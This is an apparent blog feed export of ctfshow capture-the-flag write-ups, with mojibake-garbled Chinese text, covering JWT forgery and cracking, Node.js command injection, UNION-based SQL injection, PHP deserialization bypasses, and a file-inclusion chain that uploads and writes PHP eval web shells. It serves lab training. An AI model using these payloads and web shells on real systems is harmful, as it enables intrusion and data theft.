]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2023/03/15/ctfshow%E5%90%88%E9%9B%86-jwt/</url>
    <content><![CDATA[<p>   ctfshow jwt</p>
<p>â€‹    <span id="more"></span></p>
<p>jwtå’Œcookieéƒ½æ˜¯æˆåŠŸç™»å½•åæœåŠ¡å™¨ç«¯è¿”å›å®¢æˆ·ç«¯çš„ä¸€æ®µæ•°æ®ï¼Œ ä¸‹æ¬¡ç™»å½•æ—¶é¿å…é‡æ–°è¾“å…¥è´¦å·å¯†ç ä¹‹ç±»ï¼Œæé«˜ç”¨æˆ·ä½“éªŒ<br>cookieæœ¬èº«ä¸å…·æœ‰å±å®³æ€§ï¼Œä½†æ˜¯é€šè¿‡å…¶ä»–æ‰‹æ®µxssç­‰è·å–åˆ°å¯¹æ–¹ç›¸å…³ç½‘ç«™çš„cookieåï¼Œå³å¯å®ç°å…å¯†ç ç™»å½•ï¼Œ<br>jwtç”±äºåŠ å¯†çš„ç‰¹æ®Šæ€§å¯èƒ½ä¼šé€ æˆè¶Šæƒç™»å½•ï¼Œè¶Šæƒä¿®æ”¹ç­‰å±å®³<br>jwtè¯­å¥å¾ˆå¥½è¾¨è®¤ï¼Œä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå‰ä¸¤éƒ¨åˆ†ç”±base64åŠ å¯†ï¼Œæœ€åä¸€æ®µä¸ºkeyåŠ å¯†(å¯ä»¥ç†è§£ä¸ºmd5åŠ ç›åŠ å¯†)ï¼Œä¸­é—´ä½¿ç”¨ç‚¹.æˆªæ–­ï¼Œå¹¶ä¸”å‰ä¸¤ä½å­—ç¬¦ä¸ºewï¼ˆ{ï¼‰ï¼Œä¸€èˆ¬å­˜åœ¨äºè¯·æ±‚åŒ…ï¼ˆè¿”å›åŒ…ï¼‰ä¸­çš„cookieå±æ€§å€¼ä¸­<br><a href="https://blog.csdn.net/qq_54030686/article/details/122550173">https://blog.csdn.net/qq_54030686/article/details/122550173</a></p>
<p>jwtç”±ä¸‰éƒ¨åˆ†ç»„æˆ<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>ã€payloadã€signature</p>
<p>jwtè§£å¯†ç½‘ç«™<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">&#125;</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1678972257,</span><br><span class="line">    &quot;exp&quot;: 1678979457,</span><br><span class="line">    &quot;nbf&quot;: 1678972257,</span><br><span class="line">    &quot;sub&quot;: &quot;user&quot;,  //ä¿®æ”¹ä¸ºadmin</span><br><span class="line">    &quot;jti&quot;: &quot;9cf456cedd0952af77d1abc40b53c4da&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>bpæŠ“url&#x2F;adminçš„åŒ…å¾—åˆ°cookieå€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line">æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ (å»ºè®®ä½†ä¸å¼ºåˆ¶ä½¿ç”¨) </span><br><span class="line"># iss: jwtç­¾å‘è€…</span><br><span class="line"># sub: jwtæ‰€é¢å‘çš„ç”¨æˆ·</span><br><span class="line"># aud: æ¥æ”¶jwtçš„ä¸€æ–¹</span><br><span class="line"># exp: jwtçš„è¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªè¿‡æœŸæ—¶é—´å¿…é¡»è¦å¤§äºç­¾å‘æ—¶é—´</span><br><span class="line"># nbf: å®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„</span><br><span class="line"># iat: jwtçš„ç­¾å‘æ—¶é—´</span><br><span class="line"># jti: jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»</span><br></pre></td></tr></table></figure>

<p>åbase64åŠ å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJqd3QiCn0KWwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2Nzg5NzIyNTcsCiAgICAiZXhwIjogMTY3ODk3OTQ1NywKICAgICJuYmYiOiAxNjc4OTcyMjU3LAogICAgInN1YiI6ICJhZG1pbiIsICAKICAgICJqdGkiOiAiOWNmNDU2Y2VkZDA5NTJhZjc3ZDFhYmM0MGI1M2M0ZGEiCiAgfQpd</span><br></pre></td></tr></table></figure>

<p>å‘é€</p>
<p>ctfshow{0f11af98-e3f2-4f85-b8f6-1a6e5e29e8ab}</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>å¯†ç æ˜¯123456</p>
<p>ctfshow{d0771945-aa69-41d1-97b2-5560debfa46f}</p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>åŒä¸Š</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>c-jwt-crackerä½¿ç”¨</p>
<p>â€œalgâ€: â€œHS256â€,ä¸ºå¯¹ç§°åŠ å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmNhNmQ2N2YzOGI0YWM0MmFhMThiMTA0NTcwMjNmNCJ9.PO3xD4-JJArJXohbOhKr93x8exeCRFMg8XV8yGYGZSE</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å‡ºæ¥å¯†ç ä¸ºaaab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6ImFkbWluIiwianRpIjoiNWZjYTZkNjdmMzhiNGFjNDJhYTE4YjEwNDU3MDIzZjQifQ.psZF-TG9DIQKj_GHhyHGXwoGITOJI7Lhf3vP9n2iyRA</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/brendan-rius/c-jwt-cracker">GitHub - brendan-rius&#x2F;c-jwt-crackerï¼šç”¨ C ç¼–å†™çš„ JWT è›®åŠ›ç ´è§£å™¨</a></p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>å…·ä½“å®‰è£…çœ‹ubuntu</p>
<p>ctfshow{138f48e1-f877-49fe-938f-94e0143ec751}</p>
<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow nodejs</title>
    <url>/2023/03/14/ctfshow%E5%90%88%E9%9B%86-node-js/</url>
    <content><![CDATA[<p>â€‹    ctfshow nodejs</p>
<p>NodejsåŸºäºJavascriptè¯­è¨€,<a href="http://hexo.io/">Hexo</a> æ˜¯ä¸€ä¸ªç®€å•åœ°ã€è½»é‡åœ°ã€åŸºäºNodeçš„ä¸€ä¸ªé™æ€åšå®¢æ¡†æ¶.</p>
<p>â€‹      <span id="more"></span></p>
<p><a href="https://nodejs.cn/">Node.js ä¸­æ–‡ç½‘ (nodejs.cn)</a></p>
<h2 id="ctfshowweb334"><a href="#ctfshowweb334" class="headerlink" title="ctfshowweb334"></a>ctfshowweb334</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>toUpperCase() æ–¹æ³•å°†å­—ç¬¦ä¸²å°å†™å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</p>
<p>nameä¸ç­‰äºCTFSHOW&amp;&amp;username&#x3D;&#x3D;å¤§å†™name</p>
<p>password&#x3D;123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  items: [</span><br><span class="line">    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è´¦å· ctfshow å¯†ç 123456</p>
<p>ctfshow{9f833d97-352c-48c1-960d-e865de36150a}</p>
<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout.toString();</span><br><span class="line">eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>

<p><strong>requireå¯¼å…¥æ¨¡å—</strong></p>
<p>child_processæ¨¡å—ï¼Œé€šè¿‡child_processæˆ‘ä»¬å¯ä»¥åˆ›å»ºå­è¿›ç¨‹</p>
<p><a href="https://nodejs.cn/api/child_process.html#child_processspawncommand-args-options">child_process å­è¿›ç¨‹ | Node.js API æ–‡æ¡£ (nodejs.cn)</a></p>
<p>spawnSync</p>
<p><a href="https://blog.csdn.net/qq_24013171/article/details/80368731?ops_request_misc=%7B%22request_id%22:%22167879802016800215056609%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167879802016800215056609&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-80368731-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=spawnSync&spm=1018.2226.3001.4187">(9æ¡æ¶ˆæ¯) Node.js æ‰§è¡Œç³»ç»Ÿå‘½ä»¤_node execsync å’Œ exec_é£ç¡•ä¾æºçš„åšå®¢-CSDNåšå®¢</a></p>
<p><code>stdout</code> å¯ä»¥ç”¨äºå¤„ç†è¿›ç¨‹çš„è¾“å‡º</p>
<p>toString()å°†ç¼“å†²åŒºå¯¹è±¡æ˜¾ç¤ºä¸ºå­—ç¬¦ä¸²</p>
<p>ctfshow{5ddb05d8-0267-4d06-8211-c90683eed82c}</p>
<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  	res.end(flag);</span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/nodejs/nodejs-express-framework.html">Node.js Express æ¡†æ¶ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>
<p>payload: ?a[]&#x3D;1&amp;b&#x3D;1</p>
<h2 id="web338åŸå‹é“¾æ±¡æŸ“"><a href="#web338åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web338åŸå‹é“¾æ±¡æŸ“"></a>web338åŸå‹é“¾æ±¡æŸ“</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowç»ˆæè€ƒæ ¸</title>
    <url>/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[ <span id="more"></span>

<p>åœ¨æ¶ˆæ¯å¤´ä¸­ï¼Œå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_641=ctfshow&#123;affac61c787a82cc396585bea8ecf2dc&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç ï¼Œå‘ç°&#x2F;system36d&#x2F;ï¼Œç™»å½•ï¼ŒæŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/static/js/lock/index.js</span><br></pre></td></tr></table></figure>

<p>å‘ç°</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_644=ctfshow&#123;2bb9f2183f102f6f2aedbea4788f9f1d&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢å‘ç°</p>
<p>this.pin&#x3D;0x36Dï¼Œç™»å½•</p>
<p>ç½‘ç»œæµ‹è¯•é‡Œå‘½ä»¤æ‰§è¡ŒæŠ“åŒ…æ”¹ä¸ºls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure>

<p>è®¿secret.txt,urlè§£ç ï¼Œå³å¯çœ‹è§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_643=ctfshow&#123;616cd5fc37968fc20810b2db30152717&#125;</span><br></pre></td></tr></table></figure>

<p>ç‚¹å‡»æ•°æ®å¤‡ä»½ï¼Œä¸‹è½½ï¼Œæ‰“å¼€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€è¿œç¨‹åœ¨çº¿æ›´æ–°æŠ“åŒ…ï¼Œ</p>
<p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œä¿®æ”¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>å‘é€è§£å¯†å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>!==<span class="number">99</span> &amp;&amp; <span class="variable">$user</span>!==<span class="number">10</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;1;url=login.php\&quot;&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&#x27;ä½ è¿˜æ²¡æœ‰ç™»é™†,è¯·å…ˆ&lt;a href=&quot;login.php&quot;&gt;ç™»é™†&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:main.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag_642=ctfshow&#123;<span class="number">11</span>a17b6fbdc69cedfb374f55026700fe&#125; --&gt;</span><br></pre></td></tr></table></figure>

<p>ï¼Œå…¶ä»–æºç init.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PATH&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&#x27;/db/data_you_never_know.db&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG645&#x27;</span>,<span class="string">&#x27;flag645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG646&#x27;</span>,<span class="string">&#x27;flag646=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//å­˜åœ¨æ¼æ´ï¼Œæœªä¿®è¡¥å‰æ³¨é‡Šæ‰</span></span><br><span class="line"><span class="comment">//include &#x27;util/common.php&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>users.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch ($a) &#123;</span><br><span class="line">   case &#x27;evilString&#x27;:</span><br><span class="line">       evilString($_GET[&#x27;m&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilNumber&#x27;:</span><br><span class="line">       evilNumber($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilFunction&#x27;:</span><br><span class="line">       evilFunction($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilArray&#x27;:</span><br><span class="line">       evilArray($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilClass&#x27;:</span><br><span class="line">       evilClass($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function evilString($m)&#123;</span><br><span class="line">    $key = &#x27;372619038&#x27;;</span><br><span class="line">    $content = call_user_func($m);  //call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</span><br><span class="line">    if(stripos($content, $key)!==FALSE)&#123;   //stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilClass($m,$k)&#123;</span><br><span class="line">    class ctfshow&#123;</span><br><span class="line">        public $m;</span><br><span class="line">        public function construct($m)&#123;</span><br><span class="line">            $this-&gt;$m=$m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ctfshow=new ctfshow($m);</span><br><span class="line">    $ctfshow-&gt;$m=$m;</span><br><span class="line">    if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG647&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;mmmmm?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilNumber($m,$k)&#123;</span><br><span class="line">    $number = getArray(1000,20,10,999);</span><br><span class="line">    if($number[$m]==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG648&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;number is right?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilFunction($m,$k)&#123;</span><br><span class="line">    $key = &#x27;ffffffff&#x27;;</span><br><span class="line">    $content = call_user_func($m);</span><br><span class="line">    if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG649&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not ffffffff?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilArray($m,$k)&#123;</span><br><span class="line">    $arrays=unserialize($m);</span><br><span class="line">    if($arrays!==false)&#123;</span><br><span class="line">        if(array_key_exists(&#x27;username&#x27;, $arrays) &amp;&amp; in_array(&#x27;ctfshow&#x27;, get_object_vars($arrays)) &amp;&amp;  $k==shell_exec(&#x27;cat /FLAG/FLAG650&#x27;))&#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG651&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;array?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web647,è¿”å›å€¼æ˜¯ä¸ªæ•°ç»„ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilString&amp;m=getallheaders</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<p>web648</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilClass&amp;m=1&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<p>web649,NULLç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilNumber&amp;m=&amp;key=flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<p>web650</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<p>web651</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $ctfshow = 1;</span><br><span class="line">    public $username = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize(new ctfshow));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilArray&amp;m=O%3A7%3A&quot;ctfshow&quot;%3A2%3A&#123;s%3A7%3A&quot;ctfshow&quot;%3Bi%3A1%3Bs%3A8%3A&quot;username&quot;%3Bi%3A2%3B&#125;&amp;key=flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<p>web652</p>
<p>page.php åˆæ³¨å…¥ï¼Œæˆ–è€…sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>è¿”å›ï¼šinformation_schema,test,mysql,performance_schema,ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77%23</span><br></pre></td></tr></table></figure>

<p>è¿”å›ï¼šctfshow_keys,ctfshow_secret,ctfshow_users</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0) union select group_concat(column_name) from information_schema.columns where table_name=0x63746673686f775f736563726574%23</span><br></pre></td></tr></table></figure>

<p>è¿”å›ï¼šsecret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page.php?id=0) union select secret from ctfshow_secret%23</span><br></pre></td></tr></table></figure>

<p>è¿”å›ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_652=ctfshow&#123;4b37ab4b6504d43ea0de9a688f0e3ffa&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ï¼Œkey </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select `key` from ctfshow_keys%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key_is_here_you_know</span><br></pre></td></tr></table></figure>

<p>common.php,æ–‡ä»¶åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;dbutil.php&#x27;;</span><br><span class="line">if($_GET[&#x27;k&#x27;]!==shell_exec(&#x27;cat /FLAG/FLAG651&#x27;))&#123;</span><br><span class="line">    die(&#x27;651flagæœªæ‹¿åˆ°&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]) &amp;&amp; file_exists($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if(db::get_key()==$_POST[&#x27;key&#x27;])&#123;</span><br><span class="line">        include __DIR__.DIRECTORY_SEPARATOR.$_POST[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨<code>init.php</code>å¾—åˆ°äº†dbæ–‡ä»¶ä½ç½®ï¼Œ<code>/db/data_you_never_know.db</code></li>
</ul>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>æ•°æ®æ¢å¤å¤„ä¸Šä¼ æ–‡ä»¶ï¼Œåå­—ä¸º1.dat  ï¼Œå†…å®¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«ï¼Œå³å¯å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="å†™å…¥æœ¨é©¬"><a href="#å†™å…¥æœ¨é©¬" class="headerlink" title="å†™å…¥æœ¨é©¬"></a>å†™å…¥æœ¨é©¬</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;echo &#x27;PD89ZXZhbCgkX1BPU1RbMV0pPz4=&#x27; | base64 -d &gt; zhou.php&quot;);</span><br></pre></td></tr></table></figure>

<p>å¯†ç ä¸º1</p>
